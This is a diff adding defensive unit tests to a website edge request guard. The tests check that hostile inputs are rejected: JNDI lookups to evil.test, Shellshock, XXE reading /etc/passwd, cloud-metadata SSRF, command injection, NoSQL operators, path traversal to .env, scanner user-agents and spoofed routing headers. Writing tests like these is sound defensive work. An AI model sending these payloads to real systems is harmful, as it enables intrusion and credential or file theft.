@@ -243,4 +243,65 @@ describe('website edge boundary', () => {
     expect(internalReq).toBeInstanceOf(Request);
     expect((internalReq as Request).headers.get('x-prerender-revalidate')).toBe('internal-preview-token-abc');
   });
+
+  it('blocks OWASP Top-10 payloads (JNDI, Shellshock, XXE, SSRF, OS cmd, NoSQL)', async () => {
+    const env = environment();
+    const signed = await cookie(env);
+    for (const payload of [
+      '${jndi:ldap://evil.test/a}',
+      '() { :;}; echo pwned',
+      '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
+      'http://169.254.169.254/latest/meta-data/',
+      'name; cat /etc/passwd',
+    ]) {
+      expect(isScannerInput(payload), payload).toBe(true);
+      expect((await guardWebsiteRequest(new Request(host + '/uz?q=' + encodeURIComponent(payload), { headers: client }), env) as Response).status, payload).toBe(400);
+    }
+    expect(safeIntakeObject(JSON.parse('{"phone":{"$ne":""}}'))).toBe(false);
+    expect((await guardWebsiteRequest(post('/api/submit-form', { ...lead, extra: { $where: '1==1' } }, { cookie: signed }), env) as Response).status).toBe(400);
+  });
+
+  it('blocks scanner user-agents, malicious request headers, and oversized headers', async () => {
+    const env = environment();
+    for (const ua of ['sqlmap/1.7', 'Nuclei - Open-source project']) {
+      expect((await guardWebsiteRequest(new Request(host + '/uz', { headers: { ...client, 'user-agent': ua } }), env) as Response).status).toBe(403);
+    }
+    expect((await guardWebsiteRequest(new Request(host + '/uz', { headers: { ...client, 'user-agent': '${jndi:ldap://evil.test/a}' } }), env) as Response).status).toBe(403);
+    expect((await guardWebsiteRequest(new Request(host + '/uz', { headers: { ...client, referer: 'https://evil.test/?x=${jndi:rmi://evil.test/x}' } }), env) as Response).status).toBe(403);
+    expect((await guardWebsiteRequest(new Request(host + '/uz', { headers: { ...client, 'user-agent': 'a'.repeat(1025) } }), env) as Response).status).toBe(400);
+    expect((await guardWebsiteRequest(new Request(host + '/uz', { headers: { ...client, cookie: 'c=' + 'a'.repeat(8200) } }), env) as Response).status).toBe(431);
+  });
+
+  it('blocks path traversal and CMS/config probe paths while allowing /admin and security.txt', async () => {
+    const env = environment();
+    for (const traversal of ['/%252e%252e/etc/passwd', '/uz/%252e%252e/.env', '/uz/..;/etc/passwd']) {
+      expect((await guardWebsiteRequest(new Request(host + traversal, { headers: client }), env) as Response).status, traversal).toBe(400);
+    }
+    for (const probe of ['/%2e%2e/etc/passwd', '/uz/%2e%2e/.env', '/uz/../.env', '/wp-admin/install.php', '/phpmyadmin/', '/package.json', '/.htaccess', '/actuator/env']) {
+      expect((await guardWebsiteRequest(new Request(host + probe, { headers: client }), env) as Response).status, probe).toBe(404);
+    }
+    expect(await guardWebsiteRequest(new Request(host + '/admin', { headers: client }), env)).toBeInstanceOf(Request);
+    expect(await guardWebsiteRequest(new Request(host + '/.well-known/security.txt', { headers: client }), env)).toBeInstanceOf(Request);
+  });
+
+  it('strips spoofed routing and HTTP method override headers', async () => {
+    const result = await guardWebsiteRequest(
+      new Request(host + '/uz', {
+        headers: {
+          ...client,
+          'x-forwarded-host': 'evil.test',
+          'x-original-url': '/admin',
+          'x-rewrite-url': '/admin',
+          'x-http-method-override': 'DELETE',
+          'x-method-override': 'PUT',
+          'x-http-method': 'PATCH',
+        },
+      }),
+      environment(),
+    ) as Request;
+    expect(result).toBeInstanceOf(Request);
+    for (const name of ['x-forwarded-host', 'x-original-url', 'x-rewrite-url', 'x-http-method-override', 'x-method-override', 'x-http-method']) {
+      expect(result.headers.get(name), name).toBeNull();
+    }
+  });
 });
